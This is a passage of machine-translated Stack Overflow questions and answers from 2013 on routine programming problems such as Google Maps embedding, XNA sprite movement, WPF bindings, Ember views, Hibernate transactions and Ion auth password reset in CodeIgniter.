假设其他一切都是正确的。您可以尝试查找 Google Maps 容器的主容器（我相信它是 iFrame），您可以尝试将以下 CSS 样式从外部样式表应用到它：

`#map_canvas > *{margin-top:-200px !important; display:block !important;}`

**注意：** `> *`在这种情况下，符号将从#map_canvas 中选择所有子项

这应该让它显示在您的页面上。

* * *

## 回答 #3

> 赞同：0
> 
> 时间：2013-02-13T13:46:34.477

这不是包含 Google Maps API v3 的有效方式：

```
<script src="http://maps.gstatic.com/intl/en_ALL/mapfiles/api-3/10/22/main.js" type="text/javascript"></script> 
```

您应该删除该行，下面的版本应该可以工作，但是很旧：

```
<script type="text/javascript" src="http://maps.google.com/maps/api/js?sensor=true"></script> 
```

这是当前[记录的包含 API 的方式](https://developers.google.com/maps/documentation/javascript/tutorial#HelloWorld)

```
<script type="text/javascript"
  src="https://maps.googleapis.com/maps/api/js?key=YOUR_API_KEY&sensor=SET_TO_TRUE_OR_FALSE">
</script> 
```

# c# - 我似乎无法让我的精灵移动

> ID：14853814
> 
> 赞同：-1
> 
> 时间：2013-02-13T12:41:13.333
> 
> 标签：c#

我是 c# 的新手（我昨天才开始学习）。我正在关注此链接的教程：http: [//msdn.microsoft.com/en-us/library/bb203893.aspx](http://msdn.microsoft.com/en-us/library/bb203893.aspx)。我遇到的问题是我似乎无法让我的精灵移动，甚至没有一个像素。（我已经阅读了这个主题并最终添加了一些没有真正帮助的东西）。这是我卡住的代码：

```
 void UpdateSprite(GameTime gameTime)
    {
        {
            Update(gameTime);
        }

        spritePosition +=
            spritePosition * (float)gameTime.ElapsedGameTime.TotalSeconds;

        int MaxX =
            graphics.GraphicsDevice.Viewport.Width - myTexture.Width;
        int MinX = 0;
        int MaxY =
            graphics.GraphicsDevice.Viewport.Height - myTexture.Height;
        int MinY = 0;

        if (spritePosition.X > MaxX)
        {
            spriteSpeed.X *= -1;
            spritePosition.X = MaxX;
        }

        else if (spritePosition.X < MinX)
        {
            spriteSpeed.X *= -1;
            spritePosition.X = MinX;
        }

        if (spritePosition.Y > MaxY)
        {
            spriteSpeed.Y *= -1;
            spritePosition.Y = MaxY;
        }

        else if (spritePosition.Y < MinY)
        {
            spriteSpeed.Y *= -1;
            spritePosition.Y = MinY;
        }

        // Allows the game to exit
        if (GamePad.GetState(PlayerIndex.One).Buttons.Back == ButtonState.Pressed)
            this.Exit();

        // TODO: Add your update logic here

        base.Update(gameTime);
    }

    /// <summary>
    /// This is called when the game should draw itself.
    /// </summary>
    /// <param name="gameTime">Provides a snapshot of timing values.</param>
    protected override void Draw(GameTime gameTime)
    {
        GraphicsDevice.Clear(Color.CornflowerBlue);

        spriteBatch.Begin(SpriteSortMode.BackToFront, BlendState.AlphaBlend);
        spriteBatch.Draw(myTexture, spritePosition, Color.White);
        spriteBatch.End();

        // TODO: Add your drawing code here

        base.Draw(gameTime);
    }
} 
```

}

* * *

## 回答 #1

> 赞同：1
> 
> 时间：2013-02-13T12:49:07.793

该声明应：

```
spritePosition += spritePosition * (float)gameTime.ElapsedGameTime.TotalSeconds; 
```

应该改为：

```
spritePosition += spriteSpeed * (float)gameTime.ElapsedGameTime.TotalSeconds; 
```

# iphone - 仅从 iPhone 相机获取一帧

> ID：14853817
> 
> 赞同：0
> 
> 时间：2013-02-13T12:41:16.263
> 
> 标签：iphone, ios, objective-c

我想从 iPhone 相机中获取连续帧并将其放在 UIImage 上。我已按照[此链接中的代码进行操作](https://developer.apple.com/library/ios/#qa/qa2010/qa1702.html)

我的启动相机代码是

```
- (IBAction)luanchCamera:(id)sender
{

    UIImagePickerController *controller=[[UIImagePickerController alloc]init];
    controller.sourceType = UIImagePickerControllerSourceTypeCamera;
    controller.mediaTypes =[NSArray arrayWithObject:(NSString *)kUTTypeMovie];
    controller.showsCameraControls = YES;
    imageFrameView=[[UIImageView alloc]initWithFrame:CGRectMake(0, 0,1024,718)];
    [controller.view addSubview:imageFrameView];
    controller.view.backgroundColor=[UIColor clearColor];
    controller.wantsFullScreenLayout=NO;
    controller.cameraViewTransform = CGAffineTransformScale(controller.cameraViewTransform,0.25, 0.25);
    [self setupCaptureSession];
    [self presentViewController:controller animated:YES completion:nil];

} 
```

但我只从视频中得到一帧我也删除了

```
// Assign session to an ivar.

    [self setSession:session]; 
```

从我的代码。是否有必要启动我在 launchCamera 方法中编写的相机。如何从视频中获取连续帧？

# xml - 传递多个参数时出现 XML 解析错误

> ID：14853819
> 
> 赞同：0
> 
> 时间：2013-02-13T12:41:24.347
> 
> 标签：xml

当我尝试使用我的 URl 传递两个参数时，我不断收到此错误：当我只传递一个参数时它工作正常：

XML 解析错误：格式不正确 位置：[http://helloApplet.xml](http://helloApplet.xml) 第 6 行，第 65 列：

```
<Content type="url" href="helloApplet.jsp?name=xyz&password=12345"/>
 ----------------------------------------------------------^ 
```

* * *

## 回答 #1

> 赞同：1
> 
> 时间：2013-02-13T12:53:39.593

`&`指示XML 中[字符/实体引用的开始。](http://www.w3.org/TR/xml/#dt-charref)

如果你想要一个`&`as 数据，那么你需要使用它的引用：`&amp;`

（或者您可以使用 CDATA 块，但不能在属性值内使用）。

# c# - WPF Avalon 向导绑定问题

> ID：14853824
> 
> 赞同：3
> 
> 时间：2013-02-13T12:41:46.697
> 
> 标签：c#, wpf, xaml

我正在使用[Avalon Wizard](http://avalonwizard.codeplex.com/)控件，我有很多页面，但只有 2 个给我带来了问题，所以它们将包含在内：

```
<Grid Name="MainGrid">
  <w:Wizard Name="MyWizard"
            w:Designer.PageIndex="0"
            DataContext="{Binding ElementName=MainGrid, Path=DataContext.Policy}">
    <w:WizardPage Header="Main Member"
                  MaxHeight="600"
                  AllowNext="{Binding ElementName=MainGrid, Path=DataContext.CanContinue}"
                  Name="MainPage">
      <w:WizardPage Name="DeductionPage"
                    Header="Policy Details"
                    AllowNext="{Binding ElementName=MainGrid, Path=DataContext.CanContinue}"> 
```

现在对于问题，主页的允许下一个工作正常，但是在扣除页面上，下一个按钮始终可用，尽管 CanContinue 属性设置为 false！

请注意，`CanContinue`仅在加载第二页时才设置为 false。

```
 private bool canContinue;
public bool CanContinue
{
  get { return canContinue; }
  set
  {
    canContinue = value;
    NotifyPropertyChanged("CanContinue");
  }
} 
```

--

更新

我查看了输出窗口，发现以下异常：

```
System.Windows.Data Error: 4 : Cannot find source for binding with reference 'ElementName=MainGrid'. BindingExpression:Path=DataContext.CanContinue; DataItem=null; target element is 'WizardPage' (Name='DeductionPage'); target property is 'AllowNext' (type 'Boolean') 
```

这发生在我的问题所在的页面上，但为什么它只会出现在第二页上？第一页和第二页绑定到完全相同的东西，第一页完美运行！

问题出在除第一页外的所有页面上，都是同一级别的同一向导的子级。

有什么建议么？

* * *

## 回答 #1

> 赞同：0
> 
> 时间：2013-02-13T18:53:34.290

没有看到 的代码`CanContinue`，这有点猜测。但是，在这些情况下，罪魁祸首通常是由于属性未引发[INotifyPropertyChanged](http://msdn.microsoft.com/en-us/library/system.componentmodel.inotifypropertychanged%28v=vs.95%29.aspx)事件。在您的情况下，该属性`CanContinue`必须引发 INotifyPropertyChanged 事件。

本质上，每当`CanContinue`需要评估 的值时，都必须提高 INotifyPropertyChanged。这将通知 UI 的值`CanContinue`已更改，并且 UI 必须重新评估绑定。

很多时候，INotifyPropertyChanged 是在属性本身之外引发的。例如，当一个方法执行一些需要确保 UI 仍然正确绑定的工作时。在您的情况下，这可能是在页面之间导航时。

# rebol - Rebol REPL 多行 if 语句

> ID：14853825
> 
> 赞同：1
> 
> 时间：2013-02-13T12:41:46.867
> 
> 标签：rebol, rebol3

我尝试在 Rebol REPL（又名命令行）中运行多行 while 语句，如[http://www.rebol.com/docs/expert-intro.html](http://www.rebol.com/docs/expert-intro.html)

```
if size [
    print "ok"
] 
```

我逐行输入，但在之后`if size [`，它说：

```
>> size: 0  
== 0

>> if size [
** Syntax error: missing "]" at "end-of-script"
** Near: (line 1) if size [

>> 
```

这是 REPL 的问题，我输入它的方式，还是其他什么问题？

* * *

## 回答 #1

> 赞同：4
> 
> 时间：2013-02-13T16:08:15.747

在 Rebol 2 REPL 中，这应该可以正常工作。在第一行之后，提示应该变为“继续提示”：

```
>> if size [
[    ;<cursor here> 
```

在 Rebol 3 中，REPL 当前（2013-02）不支持多行表达式。

* * *

## 回答 #2

> 赞同：1
> 
> 时间：2015-01-15T20:04:05.640

我也对这个问题感到非常沮丧。

但是我发现了一个非常糟糕的解决方法，即：将您的代码打包成一个字符串并“执行”。

因此，对于您的示例，可以输入的方式如下：

```
>> size: 0
== 0

>> do {if size [^/^-print "ok"^/]}
ok
>> 
```

我警告过你这很可怕，对吧？

# view - 如何从静态 javascript 获取 ember / emberjs 中视图实例的引用？

> ID：14853826
> 
> 赞同：9
> 
> 时间：2013-02-13T12:41:53.517
> 
> 标签：view, reference, ember.js

我在网上（SOF 和 Google）上看到了很多关于此的问题，但到目前为止还没有明确的答案。

我有一个带有各种视图和控制器的常用 Ember 应用程序。我的一个观点有一个我想从静态上下文中调用的实例方法。因此在一个普通的javascript文件中。我应该获得对 ember 实例化的视图的引用以调用该方法吗？

几行代码来说明我的问题：

**在 ApplicationView.js 中：**

```
App.ApplicationView = Em.View.extend({
    templateName: 'application',

    myInstanceMethod:function () {
       this.anotherInstanceMethod(some, params);
    },
    // ... more code
}); 
```

**在 MyUtils.js 中：**

```
var myUtils = myUtils || {
    myMethod: function() {
        myApplicationViewInstance.myInstanceMethod();
    }
}; 
```

* * *

## 回答 #1

> 赞同：6
> 
> 时间：2013-02-13T12:53:14.477

这是我个人解决这个问题的方法。我正在使用 Ember.View 的“didInsertElement”在中心位置注册视图。这适用于单例视图。对于非单例视图，必须开发更复杂的 ViewRegistry。

**余烬部分**

```
var App = Ember.Application.create({
    viewRegistry : {
        applicationView : null
    },
});

App.ApplicationView = Ember.View.extend({
    templateName : 'application',
    didInsertElement : function(){
        App.set("viewRegistry.applicationView", this);
    }
}); 
```

**在 MyUtils.js 中：**

```
var myUtils = myUtils || {
    myMethod: function() {
        App.get("viewRegistry.applicationView").myInstanceMethod();
    }
}; 
```

* * *

## 回答 #2

> 赞同：3
> 
> 时间：2014-01-15T00:42:30.390

Ember 已经有一个“全局视图哈希”

搜索`ember.js`_`Ember.View.views = {}`

它由每个视图的元素 id 索引，因此获取视图非常简单：

```
myView = Ember.View.views[$('.myViewSelector').attr('id')] 
```

然而，我的导师认为使用这种方法是一种肮脏的黑客行为，并建议我找到更好的方法。他写了一个测试助手：

```
window.lookupView = function(key) {
  var activeViews = app.__container__.lookup('router:main')._activeViews;
  if(!activeViews) { throw new Error("No active views."); }
  if(!activeViews[key]) { throw new Error("No view '%@'.".fmt(key)); }
  return activeViews[key][0];
}; 
```

我曾经得到我想要的parentView，然后是任何孩子`parentView.get('childViews')`

# asp.net - HttpRuntime.Cache 和服务层

> ID：14853827
> 
> 赞同：0
> 
> 时间：2013-02-13T12:42:02.440
> 
> 标签：asp.net, asp.net-mvc, entity-framework, asp.net-mvc-4, ef-code-first

我在名为 Cache Layer 的单独项目中有实体框架 2 级缓存类，`HttpRuntime.Cache`用于缓存，现在我想在我的服务层中使用它来缓存 EF Code First 数据库结果。

`HttpRuntime`和服务层之间有耦合吗？如果是，我如何`HttpRuntime.Cache`在不耦合的情况下在服务层中使用？

# c# - 并行线程中丢失的事务

> ID：14853830
> 
> 赞同：1
> 
> 时间：2013-02-13T12:42:06.490
> 
> 标签：c#, transactions, parallel-processing

我需要在数据库中插入一些行，如果行包含错误 - 所有更改都需要回滚。我正在考虑使用 Parallel 类。这是我的代码

```
class Program
{
static void Main(string[] args)
{
    List<string> results = new List<string>();
    string[] lines = File.ReadAllLines("d:\\opers2.txt");

    using (TransactionScope trans = new TransactionScope())
    {
        System.Threading.Tasks.Parallel.For(0, lines.Count(), i =>
            {
                string[] parts = lines[i].Split('\t');
                string answer = LoadOper(parts[9], parts[7], parts[0]);

                if (!string.IsNullOrEmpty(answer))
                    results.Add(answer);
            });

        //trans.Complete();
    }
}

static string LoadOper(string typeName, string summ, string operDate)
{
    System.Transactions.Transaction trans = System.Transactions.Transaction.Current;
    string answer = trans == null ? "NULL" : "TRANSACTION";
    using (OperEntities context = new OperEntities())
    {
        try
        {
            DateTime dt = DateTime.Parse(operDate);
            decimal summa = Decimal.Parse(summ);
            OperationType type = context.OperationTypes.FirstOrDefault(t => t.name == typeName);

            Operation oper = new Operation()
            {
                dt_oper = dt,
                summ = summa,
                OperationType = type
            };

            context.Operations.AddObject(oper);
            context.SaveChanges();
        }
        catch (Exception ex)
        {
            return answer + " " + ex.Message;
        }
    }
    return answer;
}
} 
```

但是有些线程在 LoadOper 函数中有 Transaction.Current = null 。

为什么？

# android - Android/ Eclipse：从构建路径中删除 /src 文件夹

> ID：14853833
> 
> 赞同：5
> 
> 时间：2013-02-13T12:42:14.257
> 
> 标签：android, eclipse, buildpath

这听起来像是一个愚蠢的问题，但是当我从“构建路径”中删除 Android 项目的 /src 文件夹时会发生什么（只留下 MainActivity/gen）？我仍然可以编译和运行项目，那么构建路径是做什么的呢？

背景：我对将 Maven 构建的项目导入 Eclipse 有点疯狂。它具有 /src/main/package 类型的文件夹结构，所以当我导入它时，所有声明的包名称都不匹配（显然是一个众所周知的问题）。我的第一次尝试是在导入项目之前将包在文件夹结构中向上移动（直接到 /src），但这给了我很多其他问题（关于导入其他包）。

第二次尝试是（在关于 SO 的几个问题上建议这样做）只是从构建路径中删除 /src 文件夹，瞧，包声明工作并且在 Eclipse 中没有更多显示的问题，但是我在运行时遇到了一个非常奇怪的问题和我不知道它是否与我从构建路径中删除 /src 文件夹有关。

编辑：这是运行应用程序时的错误。我应该补充一点，MyApplication 不是 Activity，但它扩展了 Application（用于存储全局变量）。谷歌地图用于该项目，但不是在第一个活动中。

```
02-20 14:39:34.781: E/AndroidRuntime(1479): FATAL EXCEPTION: main
02-20 14:39:34.781: E/AndroidRuntime(1479): java.lang.RuntimeException: Unable to instantiate application com.example.myapp.MyApplication: java.lang.ClassNotFoundException: Didn't find class "com.example.myapp.MyApplication" on path: /system/framework/com.google.android.maps.jar:/data/app/com.example.myapp-1.apk
02-20 14:39:34.781: E/AndroidRuntime(1479):     at android.app.LoadedApk.makeApplication(LoadedApk.java:504)
02-20 14:39:34.781: E/AndroidRuntime(1479):     at android.app.ActivityThread.handleBindApplication(ActivityThread.java:4364)
02-20 14:39:34.781: E/AndroidRuntime(1479):     at android.app.ActivityThread.access$1300(ActivityThread.java:141)
02-20 14:39:34.781: E/AndroidRuntime(1479):     at android.app.ActivityThread$H.handleMessage(ActivityThread.java:1294)
02-20 14:39:34.781: E/AndroidRuntime(1479):     at android.os.Handler.dispatchMessage(Handler.java:99)
02-20 14:39:34.781: E/AndroidRuntime(1479):     at android.os.Looper.loop(Looper.java:137)
02-20 14:39:34.781: E/AndroidRuntime(1479):     at android.app.ActivityThread.main(ActivityThread.java:5039)
02-20 14:39:34.781: E/AndroidRuntime(1479):     at java.lang.reflect.Method.invokeNative(Native Method)
02-20 14:39:34.781: E/AndroidRuntime(1479):     at java.lang.reflect.Method.invoke(Method.java:511)
02-20 14:39:34.781: E/AndroidRuntime(1479):     at com.android.internal.os.ZygoteInit$MethodAndArgsCaller.run(ZygoteInit.java:793)
02-20 14:39:34.781: E/AndroidRuntime(1479):     at com.android.internal.os.ZygoteInit.main(ZygoteInit.java:560)
02-20 14:39:34.781: E/AndroidRuntime(1479):     at dalvik.system.NativeStart.main(Native Method)
02-20 14:39:34.781: E/AndroidRuntime(1479): Caused by: java.lang.ClassNotFoundException: Didn't find class "com.example.myapp.MyApplication" on path: /system/framework/com.google.android.maps.jar:/data/app/com,example.myapp-1.apk
02-20 14:39:34.781: E/AndroidRuntime(1479):     at dalvik.system.BaseDexClassLoader.findClass(BaseDexClassLoader.java:65)
02-20 14:39:34.781: E/AndroidRuntime(1479):     at java.lang.ClassLoader.loadClass(ClassLoader.java:501)
02-20 14:39:34.781: E/AndroidRuntime(1479):     at java.lang.ClassLoader.loadClass(ClassLoader.java:461)
02-20 14:39:34.781: E/AndroidRuntime(1479):     at android.app.Instrumentation.newApplication(Instrumentation.java:968)
02-20 14:39:34.781: E/AndroidRuntime(1479):     at android.app.LoadedApk.makeApplication(LoadedApk.java:499)
02-20 14:39:34.781: E/AndroidRuntime(1479):     ... 11 more 
```

* * *

## 回答 #1

> 赞同：3
> 
> 时间：2013-02-22T09:18:15.457

“当我从‘构建路径’中删除 Android 项目的 /src 文件夹时会发生什么（只剩下 MainActivity/gen）？”

您创建一个“空apk”，您只能访问资源:)

关于 maven，您有两种选择：

*   使用 maven 源结构并告诉 Eclipse 源在哪里。将项目导入为“现有 Android 代码”，然后转到 Java 构建路径，删除“src”文件夹并添加文件夹“src/main/java/”和“src /测试/java”。
*   使用 eclipse 默认包结构并告诉 maven 源在哪里。在您的 pom.xml 中，添加以下指令以告诉 maven 它应该在哪里查找源：`<sourceDirectory>src</sourceDirectory>`

* * *

## 回答 #2

> 赞同：0
> 
> 时间：2013-02-19T18:39:59.880

为了回答您的部分问题，我相信无论是否构建了 src 文件夹，gen 文件和 apk 都是，并且它们是从 src 文件构建的。据我了解，这是一种级联构建。我可能是错的。我对maven没有太多经验，所以我无法回答其余的问题。希望别人可以告诉你。祝你好运！

* * *

## 回答 #3

> 赞同：0
> 
> 时间：2013-02-23T21:33:00.123

为什么不在 Eclipse 中安装“m2e”

然后使用eclipse'explorer'中的'import'菜单将maven项目导入eclipse。

那么您应该能够以两种方式构建：

在 CLI 上使用“mvn”目标

在日食

# php - Codeigniter：Ion auth 重置密码

> ID：14853834
> 
> 赞同：1
> 
> 时间：2013-02-13T12:42:25.283
> 
> 标签：php, mysql, codeigniter, ion-auth

我正在使用带有 codeigniter 的 Ion auth 库，并创建了登录、注册、记住我和忘记密码功能（到目前为止）。

对于忘记密码功能，用户输入他们的电子邮件地址，然后他们会收到一封电子邮件，其中包含重置密码的链接。

他们打开一个页面以输入新密码和确认密码，当我单击提交时，我在我的 php 日志中收到此错误：

```
PHP Fatal error:  Call to undefined method Auth::_valid_csrf_nonce() in /Applications/MAMP/htdocs/Auth/application/controllers/auth.php on line 273 
```

下载这个库时我没有改变任何东西，所以想知道我哪里出错了？

谢谢

这是我的代码来支持这一点：

授权控制器：

```
function _get_csrf_nonce()
    {
        $this->load->helper('string');
        $key = random_string('alnum', 8);
        $value = random_string('alnum', 20);
        $this->session->set_flashdata('csrfkey', $key);
        $this->session->set_flashdata('csrfvalue', $value);

        return array($key => $value);
    } 

    //reset password - final step for forgotten password
    public function reset_password($code = NULL)
    {
        if (!$code)
        {
            show_404();
        }

        $user = $this->ion_auth->forgotten_password_check($code);

        if ($user)
        {
            //if the code is valid then display the password reset form

            $this->form_validation->set_rules('new', 'New Password', 'required|min_length[' . $this->config->item('min_password_length', 'ion_auth') . ']|max_length[' . $this->config->item('max_password_length', 'ion_auth') . ']|matches[new_confirm]');
            $this->form_validation->set_rules('new_confirm', 'Confirm New Password', 'required');

            if ($this->form_validation->run() == false)
            {
                //display the form

                //set the flash data error message if there is one
                $this->data['message'] = (validation_errors()) ? validation_errors() : $this->session->flashdata('message');

                $this->data['min_password_length'] = $this->config->item('min_password_length', 'ion_auth');
                $this->data['new_password'] = array(
                    'name' => 'new',
                    'id'   => 'new',
                'type' => 'password',
                    'pattern' => '^.{'.$this->data['min_password_length'].'}.*$'
                );
                $this->data['new_password_confirm'] = array(
                    'name' => 'new_confirm',
                    'id'   => 'new_confirm',
                    'type' => 'password',
                    'pattern' => '^.{'.$this->data['min_password_length'].'}.*$'
                );
                $this->data['user_id'] = array(
                    'name'  => 'user_id',
                    'id'    => 'user_id',
                    'type'  => 'hidden',
                    'value' => $user->id
                );
                $this->data['csrf'] = $this->_get_csrf_nonce();
                $this->data['code'] = $code;

                //render
                $this->_render_page('reset_password', $this->data);
            }
            else
            {
                // do we have a valid request?
                if ($this->_valid_csrf_nonce() === FALSE || $user->id != $this->input->post('user_id'))
                {

                    //something fishy might be up
                    $this->ion_auth->clear_forgotten_password_code($code);

                    show_error('This form post did not pass our security checks.');

                }else{
                    // finally change the password
                    $identity = $user->{$this->config->item('identity', 'ion_auth')};

                    $change = $this->ion_auth->reset_password($identity, $this->input->post('new'));

                    if ($change)
                    {
                        //if the password was successfully changed
                        $this->session->set_flashdata('message', $this->ion_auth->messages());
                        $this->logout();
                    }else{
                        $this->session->set_flashdata('message', $this->ion_auth->errors());
                        redirect('reset_password/' . $code, 'refresh');
                    }
                }
            }
        }
        else
        {
            //if the code is invalid then send them back to the forgot password page
            $this->session->set_flashdata('message', $this->ion_auth->errors());
            redirect("forgot_password", 'refresh');
        }
    } 
```

忘记密码模型功能：

```
/**
     * Forgotten Password Complete
     *
     * @return string
     * @author Mathew
     **/
    public function forgotten_password_complete($code, $salt=FALSE)
    {
        $this->trigger_events('pre_forgotten_password_complete');

        if (empty($code))
        {
            $this->trigger_events(array('post_forgotten_password_complete', 'post_forgotten_password_complete_unsuccessful'));
            return FALSE;
        }

        $profile = $this->where('forgotten_password_code', $code)->users()->row(); //pass the code to profile

        if ($profile) {

            if ($this->config->item('forgot_password_expiration', 'ion_auth') > 0) {
                //Make sure it isn't expired
                $expiration = $this->config->item('forgot_password_expiration', 'ion_auth');
                if (time() - $profile->forgotten_password_time > $expiration) {
                    //it has expired
                    $this->set_error('forgot_password_expired');
                    $this->trigger_events(array('post_forgotten_password_complete', 'post_forgotten_password_complete_unsuccessful'));
                    return FALSE;
                }
            }

            $password = $this->salt();

            $data = array(
                'password'                => $this->hash_password($password, $salt),
                'forgotten_password_code' => NULL,
                'active'                  => 1,
             );

            $this->db->update($this->tables['users'], $data, array('forgotten_password_code' => $code));

            $this->trigger_events(array('post_forgotten_password_complete', 'post_forgotten_password_complete_successful'));
            return $password;
        }

        $this->trigger_events(array('post_forgotten_password_complete', 'post_forgotten_password_complete_unsuccessful'));
        return FALSE;
    } 
```

重置密码视图：

```
<div id="infoMessage"><?php echo $message;?></div>

<?php echo form_open('auth/reset_password/' . $code);?>

    <p>
        New Password (at least <?php echo $min_password_length;?> characters long): <br />
        <?php echo form_input($new_password);?>
    </p>

    <p>
        Confirm New Password: <br />
        <?php echo form_input($new_password_confirm);?>
    </p>

    <?php echo form_input($user_id);?>
    <?php echo form_hidden($csrf); ?>

    <p><?php echo form_submit('submit', 'Change');?></p>

<?php echo form_close();?> 
```

* * *

## 回答 #1

> 赞同：0
> 
> 时间：2013-06-13T08:47:59.200

您的身份验证文件中有此方法吗？

```
function _valid_csrf_nonce()
{
    if ($this->input->post($this->session->flashdata('csrfkey')) !== FALSE && $this->input->post($this->session->flashdata('csrfkey')) == $this->session->flashdata('csrfvalue')) {
        return TRUE;
    } else {
        return FALSE;
    }
} 
```

如果没有，那么添加它。

# ios - iOS 在 UITableView 中使用数组的名称作为标签

> ID：14853835
> 
> 赞同：1
> 
> 时间：2013-02-13T12:42:24.977
> 
> 标签：ios, objective-c, uilabel, plist

我目前有一个`plist`存储一堆行标签的 a `UITableView`，还有一个`plist`存储设置的第二个。

我想要的是当您创建一个新行时，该行的名称存储为 an 的名称`array`，并且相关的设置存储在数组中。

是否可以从数组名称中获得标签？我该怎么做？我如何让它将输入到文本字段中的内容存储为数组？

谢谢，

克里斯

我已经使用这段代码将我的文本字段保存为 plist 中的数组

```
- (IBAction)saveViewerItems
{
    // get paths from root directory
    NSArray *paths = NSSearchPathForDirectoriesInDomains (NSDocumentDirectory, NSUserDomainMask, YES);
    // get documents path
    NSString *documentsPath = [paths objectAtIndex:0];
    // get the path to our Data/plist file
    NSString *plistPath = [documentsPath stringByAppendingPathComponent:@"Data.plist"];

    // set the variables to the values in the text fields
    self.data = [[NSMutableArray alloc] initWithCapacity:20];

    // create dictionary with values in UITextFields
    NSDictionary *plistDict = [NSDictionary dictionaryWithObjects: [NSArray arrayWithObjects: data, nil] forKeys:[NSArray arrayWithObjects: (@"%@", text), nil]];

    NSString *error = nil;
    // create NSData from dictionary
    NSData *plistData = [NSPropertyListSerialization dataFromPropertyList:plistDict format:NSPropertyListXMLFormat_v1_0 errorDescription:&error];

    // check is plistData exists
    if(plistData)
    {
        // write plistData to our Data.plist file
        [plistData writeToFile:plistPath atomically:YES];
    }
} 
```

哪个有效，我可以看到它已保存。现在我只需要使用数组的名称作为`cellForRowAtIndexPath`.

我刚刚偶然发现另一个问题 - 每次我添加一个新项目时，它都会将它添加到 plist 中的相同位置 - 覆盖旧的..

* * *

## 回答 #1

> 赞同：0
> 
> 时间：2013-02-13T13:44:35.117

我没有完全理解你的问题。正如上面的评论中提到的，
你可以做一些类似这样的事情

```
[plistDictionary setObject:someArray forKey:textField.text]; 
```

在`cellForRow`

```
 NSArray *keys = [plistDictionary allKeys];
 cell.textLabel.Text = [keys objectAtIndex : indexPath.row] 
```

# asp.net - 产量如何在 C# 中工作

> ID：14853836
> 
> 赞同：1
> 
> 时间：2013-02-13T12:42:29.830
> 
> 标签：asp.net, c#-4.0

我正在使用产量并在某处罢工，任何人都可以解释我的场景如何产量工作如下所示。

```
public static IEnumerable Power(int number, int exponent)
{
    int result = 1;
    int counter = 0;
    Console.WriteLine("Inside Power - Before While");
    while (counter++ < exponent)
    {
        Console.WriteLine("Inside Power - Inside While");
        result = result * number;
        yield return result;
        //Console.WriteLine("New line added");
    }
    Console.WriteLine("Inside Power - After While"); 
}

static void Main(string[] args)
{
    foreach (int i in Power(2, 8))
    {
        Console.WriteLine("{0}", i);
    }
} 
```

所以我们在这里得到的输出是

```
Inside Power - Before While
Inside power - Inside While
2
Inside power - Inside While
4
Inside power - Inside While
8
Inside power - Inside While
16
Inside power - Inside While
32
Inside power - Inside While
64
Inside power - Inside While
128
Inside power - Inside While
256
Inside power - AfterWhile 
```

所以我的问题是指针如何从 foreach 转移到 Enumerable 方法 while 循环和打印等等。为什么不调用整个方法，并且每次只执行while循环。

* * *

## 回答 #1

> 赞同：1
> 
> 时间：2013-02-13T12:48:05.637

yield return 语句在语义上等同于 return 语句（将控制流传递给调用方法），然后在 foreach 循环的下一次迭代中将“goto”传递给 yield 语句。

```
Return
Goto 
```

公共语言运行时中不存在此行为。它由 C# 编译器生成的类实现。然后由 CLR 执行和 JIT 编译。Yield 是语法糖的一种形式。

# java - 如何强制将新记录*立即*保存到数据库中？

> ID：14853837
> 
> 赞同：1
> 
> 时间：2013-02-13T12:42:30.913
> 
> 标签：java, hibernate, transactions, glassfish, seam

我正在开发一个带有两个线程的 Java/Seam/Hibernate/Glassfish 应用程序：

*   *线程 #1*发送各种消息并将摘要信息写入 MySQL 数据库。
*   *线程 #2*定期轮询数据库（由 a 调用`ScheduledExecutorService`）并作用于每条消息的当前“状态”。

遇到了一个集成测试问题：*Thread #2*等待*Thread #1*添加新行的时间似乎并不重要，它只是在测试期间没有添加，所以没有进行预期的调用. 果然，在测试失败后会弹出一个新行 - 但为时已晚。不确定这是否可能是一个设计问题 -*线程 #2*当前使用`Lifecycle.beginCall()...Lifecycle.endCall()`. 所以我的理解（这可能是错误的）可能是由于两个线程有​​两个单独的 Hibernate 会话 - 所以一个阅读不知道来自一个写作的最新信息？

可能有不同的方法来解决这个问题，但我目前的想法是我不能在我调用`save()`/`flush()`甚至手动提交事务时强制 Hibernate 立即将记录添加到表中吗？这些都没有运气 - 让我想知道是否在幕后使用了某种托管事务。感谢您的任何建议...

有关信息，这是添加记录的代码的要点：

```
// Obtain Hibernate session
Session session = (Session) Component.getInstance("hibernateSession");

// Create request
Request newRequest = new Request();
// newRequest.set<blah>();

// Save the new request to the database
session.save(newRequest);

// Have tried session.flush(), transaction.commit() etc. here.
// Nothing seems to put the record into the database straight away. 
```

不确定这是否相关，但这里是 Hibernate 配置：

```
<property name="transaction.flush_before_completion">true</property>
<property name="connection.release_mode">after_statement</property>
<property name="transaction.manager_lookup_class">org.hibernate.transaction.SunONETransactionManagerLookup</property>
<property name="transaction.factory_class">org.hibernate.transaction.JTATransactionFactory</property>
<property name="current_session_context_class">jta</property> 
```

（由于这是客户拥有的现有应用程序，我无权更改 Hibernate 配置。）

* * *

## 回答 #1

> 赞同：1
> 
> 时间：2013-02-13T12:56:54.523

你的猜测不错。

您正在使用`JTATransactionFactory`，因此事务由 JTA 划分（即由容器划分）。

您用来保存的方法`Request`（这里我假设它是在 EJB 中定义的）需要使用事务注释进行注释：`@TransactionAttribute(TransactionAttributeType.REQUIRES_NEW)`，因此当方法结束时，事务被提交。

* * *

## 回答 #2

> 赞同：0
> 
> 时间：2013-02-13T17:01:31.960

非常感谢@Carlo Pellegrini，他的回答为我指明了正确的方向。从那以后，我遇到了[这个答案](https://stackoverflow.com/a/1808620/1063716)，并在 save() 操作后尝试了以下代码：

```
// Commit Seam-managed transaction (if there is one)
UserTransaction userTransaction = (UserTransaction) Component.getInstance("org.jboss.seam.transaction.transaction");
if (userTransaction.isActive()) {
    userTransaction.commit();
} 
```

好吧，它很好地完成了这项工作，但我不喜欢它 - 似乎有点 hacky！有没有更好的办法？

# c# - 通过 LINQ 进行多连接和分组

> ID：14853840
> 
> 赞同：2
> 
> 时间：2013-02-13T12:42:41.617
> 
> 标签：c#, asp.net-mvc, linq, sql-to-linq-conversion

我需要生成这个数据模型（示例）：

```
IList<FeatureGroupFeaturesDto> fcf = new List<FeatureGroupFeaturesDto>();

fcf.Add(new FeatureGroupFeaturesDto
{
    FeatureGroup = new FeatureGroupDto { Id = 1, Name = "Interior" },
    Features = new List<FeatureDto> { 
        new FeatureDto { Id = 7, Name = "Bancos Traseiros Rebatíveis" },
        new FeatureDto { Id = 35, Name = "Computador de Bordo" },
        new FeatureDto { Id = 38, Name = "Suporte para Telemóvel" }
    },
});

fcf.Add(new FeatureGroupFeaturesDto
{
    FeatureGroup = new FeatureGroupDto { Id = 2, Name = "Exterior" },
